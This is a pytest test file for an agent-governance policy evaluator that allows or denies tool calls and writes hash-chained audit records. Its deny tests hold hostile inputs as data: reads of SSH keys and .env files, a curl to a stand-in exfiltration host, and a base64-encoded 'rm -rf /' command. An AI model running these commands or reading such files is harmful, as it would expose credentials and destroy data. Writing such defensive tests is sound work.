"""Tests for the GovMCP v2 policy evaluator."""

import os
import sys
from pathlib import Path

REPO = Path(__file__).resolve().parents[1]
SCRIPTS = REPO / "scripts"
if str(SCRIPTS) not in sys.path:
    sys.path.insert(0, str(SCRIPTS))

from classifier import classify, TIER_DIRECT, TIER_INFERRED, TIER_OPAQUE, TIER_UNINSPECTABLE
from policy_eval_v2 import evaluate, load_policy_rules


# Use repo root as the allowed base dir for testing
os.environ.setdefault("GOV_CANONICAL_REPO_PATH", str(REPO))
os.environ.setdefault("GOV_RUNTIME_PATH", "/tmp/gov_runtime")


def _policy():
    return load_policy_rules(REPO / "capabilities" / "policy-rules.json")


# ---------------------------------------------------------------------------
# ALLOW decisions — operations within allowed scope
# ---------------------------------------------------------------------------

class TestAllowDecisions:
    def test_read_within_repo(self):
        c = classify("Read", {"file_path": str(REPO / "scripts" / "classifier.py")})
        r = evaluate(c, _policy())
        assert r["policy_decision"] == "ALLOW"
        assert r["matched_rule"] == "read-source-allow"

    def test_write_within_repo(self):
        c = classify("Write", {"file_path": str(REPO / "tmp" / "test.txt"), "content": "hello"})
        r = evaluate(c, _policy())
        assert r["policy_decision"] == "ALLOW"
        assert r["matched_rule"] == "write-source-allow"

    def test_list_within_repo(self):
        c = classify("Glob", {"pattern": "*.py", "path": str(REPO)})
        r = evaluate(c, _policy())
        assert r["policy_decision"] == "ALLOW"

    def test_delete_within_repo(self):
        c = classify("delete_file", {"file_path": str(REPO / "tmp" / "junk.txt")})
        r = evaluate(c, _policy())
        assert r["policy_decision"] == "ALLOW"
        assert r["matched_rule"] == "delete-source-allow"

    def test_move_within_repo(self):
        c = classify("move_file", {
            "src": str(REPO / "tmp" / "a.txt"),
            "dst": str(REPO / "tmp" / "b.txt"),
        })
        r = evaluate(c, _policy())
        assert r["policy_decision"] == "ALLOW"

    def test_tier2_local_command(self):
        c = classify("Bash", {"command": "git status"})
        r = evaluate(c, _policy())
        assert r["policy_decision"] == "ALLOW"
        # git status classifies as read/repository/Tier 2 — matches read-source-allow

    def test_tier2_pytest(self):
        c = classify("Bash", {"command": "pytest tests/"})
        r = evaluate(c, _policy())
        assert r["policy_decision"] == "ALLOW"


# ---------------------------------------------------------------------------
# DENY decisions — policy violations
# ---------------------------------------------------------------------------

class TestDenyDecisions:
    def test_sensitive_path_ssh(self):
        c = classify("Read", {"file_path": "~/.ssh/id_rsa"})
        r = evaluate(c, _policy())
        assert r["policy_decision"] == "DENY"
        assert r["matched_rule"] == "sensitive-path-deny"

    def test_sensitive_path_env(self):
        c = classify("Read", {"file_path": "/app/.env"})
        r = evaluate(c, _policy())
        assert r["policy_decision"] == "DENY"

    def test_sensitive_path_etc(self):
        c = classify("Write", {"file_path": "/etc/hosts", "content": "x"})
        r = evaluate(c, _policy())
        assert r["policy_decision"] == "DENY"

    def test_outside_base_dirs(self):
        c = classify("Write", {"file_path": "/opt/dangerous/payload.sh", "content": "x"})
        r = evaluate(c, _policy())
        assert r["policy_decision"] == "DENY"

    def test_network_denied(self):
        c = classify("Bash", {"command": "curl https://evil.com/exfil"})
        r = evaluate(c, _policy())
        assert r["policy_decision"] == "DENY"

    def test_tier3_opaque_denied(self):
        c = classify("Bash", {"command": "python deploy.sh"})
        r = evaluate(c, _policy())
        assert r["policy_decision"] == "DENY"
        assert r["matched_rule"] == "tier3-approval-required"

    def test_tier4_uninspectable_denied(self):
        encoded = "cHl0aG9uIC1jICdpbXBvcnQgb3M7IG9zLnN5c3RlbSgicm0gLXJmIC8iKSc="
        c = classify("Bash", {"command": encoded})
        r = evaluate(c, _policy())
        assert r["policy_decision"] == "DENY"
        assert r["matched_rule"] == "tier4-deny"

    def test_hidden_path_write_denied(self):
        c = classify("Write", {"file_path": str(REPO / ".secret" / "config"), "content": "x"})
        r = evaluate(c, _policy())
        assert r["policy_decision"] == "DENY"


# ---------------------------------------------------------------------------
# Record structure
# ---------------------------------------------------------------------------

class TestRecordStructure:
    def test_record_has_required_fields(self):
        c = classify("Read", {"file_path": str(REPO / "README.md")})
        r = evaluate(c, _policy())
        assert r["record_version"] == "2.0"
        assert r["record_type"] == "mediated_decision"
        assert "timestamp_utc" in r
        assert "request_id" in r
        assert "classification" in r
        assert "evidence" in r
        assert "policy_decision" in r
        assert "matched_rule" in r
        assert "record_hash" in r
        assert r["record_hash"].startswith("sha256:")

    def test_classification_in_record(self):
        c = classify("Read", {"file_path": str(REPO / "scripts" / "classifier.py")})
        r = evaluate(c, _policy())
        cl = r["classification"]
        assert "action_type" in cl
        assert "targets" in cl
        assert "scope" in cl
        assert "confidence_tier" in cl

    def test_prev_record_hash_linkage(self):
        c = classify("Read", {"file_path": str(REPO / "README.md")})
        r = evaluate(c, _policy(), prev_record_hash="sha256:abc123")
        assert r["prev_record_hash"] == "sha256:abc123"

    def test_user_identity_recorded(self):
        c = classify("Read", {"file_path": str(REPO / "README.md")})
        r = evaluate(c, _policy(), user_identity="test_user")
        assert r["user_identity"] == "test_user"

    def test_deny_has_policy_reasons(self):
        c = classify("Read", {"file_path": "~/.ssh/id_rsa"})
        r = evaluate(c, _policy())
        assert r["policy_decision"] == "DENY"
        assert len(r["policy_reasons"]) > 0
        assert "code" in r["policy_reasons"][0]
        assert "detail" in r["policy_reasons"][0]

    def test_allow_has_empty_policy_reasons(self):
        c = classify("Read", {"file_path": str(REPO / "scripts" / "classifier.py")})
        r = evaluate(c, _policy())
        assert r["policy_decision"] == "ALLOW"
        assert r["policy_reasons"] == []

    def test_record_hash_deterministic(self):
        c = classify("Read", {"file_path": str(REPO / "scripts" / "classifier.py")})
        r = evaluate(c, _policy())
        # Re-compute hash to verify determinism
        import json, hashlib
        hashable = dict(r)
        hashable["record_hash"] = None
        canonical = json.dumps(hashable, sort_keys=True, separators=(",", ":"), ensure_ascii=False)
        expected = "sha256:" + hashlib.sha256(canonical.encode("utf-8")).hexdigest()
        assert r["record_hash"] == expected


# ---------------------------------------------------------------------------
# Policy rules loading
# ---------------------------------------------------------------------------

class TestPolicyRulesLoading:
    def test_load_default_rules(self):
        p = _policy()
        assert p["policy_version"] == "2.0"
        assert "rules" in p
        assert len(p["rules"]) > 0

    def test_rules_have_required_fields(self):
        p = _policy()
        for rule in p["rules"]:
            assert "id" in rule
            assert "match" in rule
            assert "decision" in rule
            assert rule["decision"] in ("ALLOW", "DENY")


# ---------------------------------------------------------------------------
# Edge cases
# ---------------------------------------------------------------------------

class TestEdgeCases:
    def test_no_args(self):
        c = classify("mystery_tool", {})
        r = evaluate(c, _policy())
        # Opaque with no targets → tier3 deny
        assert r["policy_decision"] == "DENY"

    def test_git_push_network_denied(self):
        c = classify("Bash", {"command": "git push origin main"})
        r = evaluate(c, _policy())
        # Network + remote scope → denied by network rule
        assert r["policy_decision"] == "DENY"

    def test_original_tool_in_record(self):
        c = classify("MyCustomTool", {"file_path": str(REPO / "test.txt")})
        r = evaluate(c, _policy())
        assert r["original_tool"] == "MyCustomTool"
